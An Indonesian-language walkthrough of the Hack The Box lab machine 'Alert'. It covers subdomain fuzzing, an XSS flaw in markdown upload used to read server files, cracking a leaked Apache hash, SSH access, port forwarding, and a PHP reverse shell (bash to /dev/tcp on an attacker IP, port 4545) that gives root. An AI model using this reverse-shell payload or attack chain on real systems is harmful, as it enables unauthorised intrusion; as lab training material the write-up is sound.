**OS**: Linux  
**Difficulty**: Easy  
**IP**: 10.10.11.44
## **Tahap Enumerasi**

Pada tahap awal enumerasi, diperoleh hasil pemindaian jaringan yang mengidentifikasi dua port terbuka, yaitu port 22 (SSH) dan port 80 (HTTP). Berdasarkan nama mesin "Alert", diduga terdapat kerentanan Cross-Site Scripting (XSS) yang menjadi kunci penyelesaian challenge ini.

Melalui proses enumerasi subdomain dengan perintah:

```bash
ffuf -c -u http://alert.htb -H "Host: FUZZ.alert.htb" -w ~/wordlists.txt -fc 301
```


berhasil diidentifikasi subdomain `statistics.alert.htb`.

## **Tahap Eksploitasi Awal**

Pada halaman web terdeteksi fitur unggah file markdown beserta fitur tampilan yang berfungsi dengan baik. Setelah melakukan berbagai percobaan, berhasil diidentifikasi kerentanan XSS yang dapat dieksploitasi melalui file markdown.

### **Metode Eksploitasi yang Berhasil:**

1. **Menjalankan Web Server Lokal:**
    

```bash
python3 -m http.server 8888
```


2. **Memanfaatkan Payload XSS:**  
    Melalui eksploitasi ini, berhasil diperoleh akses terhadap file `/etc/passwd` yang mengungkapkan adanya dua pengguna dalam sistem. Percobaan brute-force SSH tidak memberikan hasil yang diinginkan.
    

Selanjutnya, pada file konfigurasi Apache ditemukan kredensial dalam format hash:

```
al*t:apr1b**BJOg$igG8WBt*TQdLjSW***/
```

Hash Apache MD5 tersebut berhasil didekripsi menggunakan John the Ripper:

```
john --wordlist=/usr/share/wordlists/rockyou.txt --format=md5crypt-long tt.hash
```

## **Perolehan Akses Pengguna**

Menggunakan kredensial yang diperoleh, berhasil melakukan login SSH sebagai pengguna 'ALBERT' dan mengambil flag user.txt.

## **Eskalasi Hak Akses**

### **Port Forwarding dan Eksploitasi:**

1. **Melakukan Port Forwarding:**

```bash
ssh -L 8080:127.0.0.1:8080 -vl albert alert.htb
```

2. **Akses Antarmuka Web:**  
    Mengakses `localhost:8080` melalui browser yang menampilkan website monitor dari direktori `/opt`.
    
3. **Unggah PHP Shell:**  
    Pada direktori `/opt`, ditemukan folder management yang memungkinkan pengunggahan file PHP reverse shell:
    

File `letmein.php` berisi:

```php
<?php system("bash -c 'bash -i >& /dev/tcp/10.10.xx.xx/4545 0>&1'"); ?>
```

(Catatan: Alamat IP disesuaikan dengan IP attacker)

4. **Penyiapan Listener:**  
    Menjalankan listener pada port 4545:
    

```bash
nc -lvnp 4545
```

5. **Aktivasi Shell:**  
    Mengakses file PHP yang telah diunggah melalui `http://localhost:8080/config/letmein.php` berhasil memberikan koneksi shell dengan hak akses root.
    

## **Kesimpulan**

Mesin Alert HTB memberikan pembelajaran mengenai pentingnya validasi input pada fitur unggah file dan keamanan konfigurasi service internal. Meskipun proses mendapatkan akses awal memerlukan beberapa tahapan, eskalasi hak akses ke root relatif mudah dilakukan setelah service internal berhasil diakses.